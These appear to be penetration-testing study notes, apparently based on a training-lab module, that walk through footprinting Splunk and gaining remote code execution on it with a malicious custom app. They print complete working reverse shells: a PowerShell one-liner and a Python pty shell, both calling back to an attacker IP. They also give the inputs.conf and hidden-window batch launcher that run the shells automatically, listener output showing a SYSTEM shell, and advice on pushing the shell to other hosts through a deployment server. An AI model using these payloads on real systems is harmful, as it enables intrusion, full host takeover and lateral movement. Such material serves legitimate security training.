ooSplunk is a log analytics tool used to gather, analyze and visualize data. It is not SEIM (Security ) Splunk is often used for security monitoring and business analytics. Splunk did not have much vulnerabilities over the years excep `RCE 2011` and `info disclosure 2018.`

### Discovery/Footprinting
Splunk run with root permission on linux or window system. The Splunk web server runs by default on port `8000`. On older versions of Splunk, the default credentials are `admin:changeme`,

![[Pasted image 20251021152636.png]]

Latest splunk version create credentials while installing so its not worth it to check if default credentials not work.
Nmap identified the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.

```shell
sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
```

## Enumeration
The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about.

![[Pasted image 20251021153345.png]]

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.

![[Pasted image 20251021153400.png]]

Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has [47](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVEs. During scan we will see many no exploitable splunk vulnerabilities.

Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. We can also run Python  code on splunk
# Attacking Splunk

As discussed in the previous section, we can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. We see splunk is installed on window and comes with default python installation so we can create a python script.
### Abusing Built-In Functionality

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.

To achieve this, we first need to create a custom Splunk application using the following directory structure.

```shell
tree splunk_shell/

splunk_shell/
├── bin
└── default
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```shell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.
```shell
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

The next step is to choose `Install app from file` and upload the application

![Splunk Enterprise Apps page listing apps with options to browse, install from file, and create new apps.](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).
```shell
sudo nc -lnvp 443
```

Upload the file.
![[Pasted image 20251021160406.png]]

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

```shell
 sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
```

```shell

PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.















































